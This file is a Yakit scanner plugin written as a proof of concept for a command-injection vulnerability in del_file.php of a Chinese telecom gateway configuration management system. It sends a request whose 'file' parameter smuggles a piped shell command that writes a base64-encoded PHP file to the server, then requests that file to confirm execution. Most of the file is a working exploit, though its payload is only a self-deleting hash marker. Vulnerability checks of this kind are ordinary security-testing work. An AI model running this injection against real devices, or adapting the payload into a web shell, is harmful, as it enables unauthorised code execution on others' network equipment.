# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target, port) {
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    filename = randstr(8),
    flag = codec.Md5("123456")  // 固定md5校验值

    // 构建第一个GET请求，注入恶意命令
    packet1 = `GET /manager/newtpl/del_file.php?file=1.txt%7Cecho%20PD9waHAgZWNobyBtZDUoJzEyMzQ1NicpO3VubGluayhfX0ZJTEVfXyk7Pz4%3D%20%7C%20base64%20-d%20%3E%20{{params(filename)}}.php HTTP/1.1
Host: {{params(target)}}
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close`

    // 构建第二个GET请求，访问生成的PHP文件
    packet2 = `GET /manager/newtpl/{{params(filename)}}.php HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Connection: close`

    // 发送第一个请求
    rsp, req, _ = poc.HTTP(packet1,
        poc.params({"target": addr, "filename": filename}),
        poc.https(isTls),
        poc.redirectTimes(0),
    )

    // 发送第二个请求，访问生成的PHP文件
    rsp1, req1, _ = poc.HTTP(packet2,
        poc.params({"target": addr, "filename": filename}),
        poc.https(isTls),
        poc.redirectTimes(0),
    )

    // 判断返回结果
    if str.MatchAllOfSubString(rsp1, `HTTP/1.1 200`, flag) {
        yakit.Info("%v found 电信网关配置管理系统 del_file.php 命令执行漏洞", addr)
        risk.NewRisk(
            addr,
            risk.title("电信网关配置管理系统 del_file.php 命令执行漏洞"),
            risk.severity("critical"),
            risk.titleVerbose("电信网关配置管理系统 del_file.php 命令执行漏洞"),
            risk.request(string(req)),
            risk.response(string(rsp)),
            risk.cve("no cve"),
        )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // 处理匹配结果
    if !result.IsOpen() {
        return
    }

    if len(result.Fingerprint.HttpFlows) > 0 {
        handleCheck(result.Target, result.Port)
    }
}
